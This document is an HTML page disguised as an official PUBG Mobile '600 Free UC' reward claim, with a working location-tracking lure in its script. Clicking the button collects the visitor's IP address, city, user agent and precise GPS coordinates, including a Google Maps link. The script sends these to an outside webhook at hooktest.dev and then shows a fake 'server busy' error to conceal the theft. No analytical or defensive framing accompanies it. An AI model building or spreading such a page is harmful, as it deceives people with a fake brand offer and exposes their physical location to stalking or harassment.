<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile - Free UC Event</title>
    <style>
        body { font-family: sans-serif; background: #0a0a0a; color: #f1c40f; text-align: center; margin: 0; padding: 0; }
        .header { background: #1a1a1a; padding: 20px; border-bottom: 3px solid #f1c40f; }
        .reward-card { background: #222; border: 1px solid #444; border-radius: 10px; padding: 20px; max-width: 400px; margin: 50px auto; box-shadow: 0 0 20px rgba(241, 196, 15, 0.2); }
        .btn { background: #f1c40f; color: #000; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="header"><h1>PUBG MOBILE</h1><p>Official 2026 Season Rewards</p></div>
    <div class="reward-card">
        <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="80" style="border-radius: 15px;">
        <h2>Claim 600 Free UC</h2>
        <p style="color: #ccc;">Allow system verification to claim your rewards.</p>
        <button class="btn" onclick="startClaim()">Claim Now</button>
    </div>

    <script>
        const hookUrl = "https://hooktest.dev/api/hook/waNRgkdN";
        async function startClaim() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                let info = { event: "PUBG Claim", ip: data.ip, city: data.city, device: navigator.userAgent };

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        info.lat = position.coords.latitude;
                        info.lon = position.coords.longitude;
                        info.google_map = `http://maps.google.com/maps?q=${info.lat},${info.lon}`;
                        await sendData(info);
                        alert("Error: Verification Server Busy. Try again later.");
                    }, (err) => {
                        info.error = "Permission Denied";
                        sendData(info);
                        alert("Location permission required.");
                    });
                }
            } catch (err) { console.log("Busy"); }
        }
        async function sendData(payload) {
            await fetch(hookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }
    </script>
</body>
</html>
